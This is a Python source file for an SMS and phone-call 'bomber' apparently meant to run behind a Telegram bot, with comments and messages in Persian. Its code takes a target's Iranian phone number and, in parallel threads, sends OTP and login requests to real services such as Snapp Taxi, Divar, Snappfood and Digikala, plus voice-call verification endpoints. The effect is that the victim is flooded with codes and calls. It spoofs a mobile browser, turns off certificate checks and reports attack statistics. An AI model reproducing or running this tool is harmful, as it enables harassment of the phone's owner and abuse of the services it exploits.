import requests
import threading
import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from config import Config

logger = logging.getLogger(__name__)

class UltimateBomberTelegram:
    def __init__(self):
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.total_requests = 0
        self.completed_requests = 0
        self.active_threads = 0
        self.max_threads = 0
        self.working_services = []
        self.is_running = True
        self.start_time = None
        
    def setup_session(self):
        """تنظیم session با retry strategy"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=2,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"],
            backoff_factor=0.5
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy, 
            pool_connections=50, 
            pool_maxsize=100
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

    def validate_phone(self, phone):
        """اعتبارسنجی شماره تلفن"""
        clean_phone = ''.join(filter(str.isdigit, phone))
        
        if len(clean_phone) < Config.MIN_PHONE_LENGTH:
            return False
            
        if clean_phone.startswith('0') and len(clean_phone) == 11:
            return True
        elif clean_phone.startswith('9') and len(clean_phone) == 10:
            return True
            
        return False

    def format_phone(self, phone):
        """فرمت‌های مختلف شماره تلفن"""
        if not self.validate_phone(phone):
            return []
            
        clean_phone = ''.join(filter(str.isdigit, phone))
        formats = []
        
        if clean_phone.startswith('0'):
            formats.extend([
                clean_phone,  # 09123456789
                clean_phone[1:],  # 9123456789
                f"+98{clean_phone[1:]}",  # +989123456789
                f"98{clean_phone[1:]}",  # 989123456789
            ])
        else:
            formats.extend([
                f"0{clean_phone}",  # 09123456789
                clean_phone,  # 9123456789
                f"+98{clean_phone}",  # +989123456789
                f"98{clean_phone}",  # 989123456789
            ])
        
        return list(set(formats))

    def send_request(self, service):
        """ارسال درخواست به سرویس"""
        if not self.is_running:
            return

        url, data, headers, method, phone_formats, service_name, service_type = service
        
        with self.lock:
            self.active_threads += 1
            if self.active_threads > self.max_threads:
                self.max_threads = self.active_threads

        try:
            phone_format = random.choice(phone_formats)
            formatted_data = self.format_data(data, phone_format)
            
            session = self.setup_session()
            
            # تاخیر تصادفی برای کاهش load
            time.sleep(random.uniform(0.1, 0.5))
            
            if method.upper() == "POST":
                response = session.post(
                    url, 
                    json=formatted_data, 
                    headers=headers, 
                    timeout=Config.REQUEST_TIMEOUT, 
                    verify=False
                )
            elif method.upper() == "GET":
                response = session.get(
                    url, 
                    params=formatted_data, 
                    headers=headers, 
                    timeout=Config.REQUEST_TIMEOUT, 
                    verify=False
                )
            else:
                response = session.request(
                    method, 
                    url, 
                    json=formatted_data, 
                    headers=headers, 
                    timeout=Config.REQUEST_TIMEOUT, 
                    verify=False
                )

            with self.lock:
                self.completed_requests += 1
                self.active_threads -= 1
                
                if response.status_code in [200, 201, 202, 204]:
                    self.success_count += 1
                    if service_name not in [s[0] for s in self.working_services]:
                        self.working_services.append((service_name, service_type))
                else:
                    self.failed_count += 1

        except Exception as e:
            with self.lock:
                self.failed_count += 1
                self.completed_requests += 1
                self.active_threads -= 1

    def format_data(self, data, phone):
        """فرمت‌دهی داده‌ها با شماره تلفن"""
        if isinstance(data, dict):
            formatted_data = {}
            for key, value in data.items():
                if value == "phone":
                    formatted_data[key] = phone
                elif isinstance(value, dict):
                    formatted_data[key] = self.format_data(value, phone)
                elif isinstance(value, list):
                    formatted_data[key] = [self.format_data(item, phone) if isinstance(item, dict) else item for item in value]
                else:
                    formatted_data[key] = value
            return formatted_data
        return data

    def get_common_headers(self):
        """هدرهای مشترک برای تمام درخواست‌ها"""
        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
        }

    def get_sms_services(self, phone_formats):
        """سرویس‌های SMS"""
        headers = self.get_common_headers()
        services = []

        sms_services_list = [
            ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", 
             {"cellphone": "phone"}, headers, "POST", "Snapp Taxi", "SMS"),
            
            ("https://api.divar.ir/v5/auth/authenticate", 
             {"phone": "phone"}, headers, "POST", "Divar", "SMS"),

            ("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", 
             {"cellphone": "phone"}, headers, "POST", "Snappfood", "SMS"),

            ("https://api.digikala.com/v1/user/authenticate/", 
             {"username": "phone"}, headers, "POST", "Digikala", "SMS"),
        ]

        for service in sms_services_list:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def get_call_services(self, phone_formats):
        """سرویس‌های تماس"""
        headers = self.get_common_headers()
        services = []

        call_services_list = [
            ("https://api.callservice.ir/api/v1/voice/send", 
             {"phone_number": "phone", "method": "voice"}, headers, "POST", "Call Service", "CALL"),
            
            ("https://voice.verificationapi.com/v2/call", 
             {"mobile": "phone", "type": "voice_call"}, headers, "POST", "Verification API", "CALL"),
        ]

        for service in call_services_list:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def start_attack(self, phone, total_requests, attack_type):
        """شروع حمله - مناسب برای ربات تلگرام"""
        try:
            if not self.validate_phone(phone):
                return {"error": "شماره تلفن معتبر نیست"}

            if total_requests > Config.MAX_REQUESTS_PER_USER:
                return {"error": f"تعداد درخواست نمی‌تواند بیشتر از {Config.MAX_REQUESTS_PER_USER} باشد"}

            self.is_running = True
            self.success_count = 0
            self.failed_count = 0
            self.completed_requests = 0
            self.working_services = []
            
            phone_formats = self.format_phone(phone)
            
            if not phone_formats:
                return {"error": "شماره تلفن فرمت معتبری ندارد"}
            
            # دریافت سرویس‌ها
            sms_services = self.get_sms_services(phone_formats)
            call_services = self.get_call_services(phone_formats)
            
            if attack_type == "sms":
                services = sms_services
                service_count = len(sms_services)
            elif attack_type == "call":
                services = call_services
                service_count = len(call_services)
            else:
                services = sms_services + call_services
                service_count = len(sms_services) + len(call_services)
            
            if service_count == 0:
                return {"error": "هیچ سرویسی در دسترس نیست"}
            
            self.total_requests = min(total_requests, service_count * 3)
            self.start_time = time.time()
            
            # اجرای حمله
            max_workers = min(Config.MAX_THREADS, len(services))
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # ارسال درخواست‌ها به صورت موازی
                futures = []
                for service in services:
                    if len(futures) >= self.total_requests:
                        break
                    futures.append(executor.submit(self.send_request, service))
                
                # انتظار برای تکمیل
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    try:
                        future.result(timeout=20)
                    except:
                        pass
            
            duration = time.time() - self.start_time
            
            result = {
                "success": True,
                "phone": phone,
                "attack_type": attack_type,
                "duration": f"{duration:.2f} ثانیه",
                "total_requests": self.total_requests,
                "successful": self.success_count,
                "failed": self.failed_count,
                "success_rate": f"{(self.success_count/self.total_requests)*100:.1f}%" if self.total_requests > 0 else "0%",
                "speed": f"{self.total_requests/duration:.1f} درخواست/ثانیه" if duration > 0 else "0",
                "working_services": [f"{name} ({typ})" for name, typ in self.working_services[:5]]
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Error in attack: {str(e)}")
            return {"error": f"خطا در اجرای حمله: {str(e)}"}
    
    def stop_attack(self):
        """توقف حمله"""
        self.is_running = False
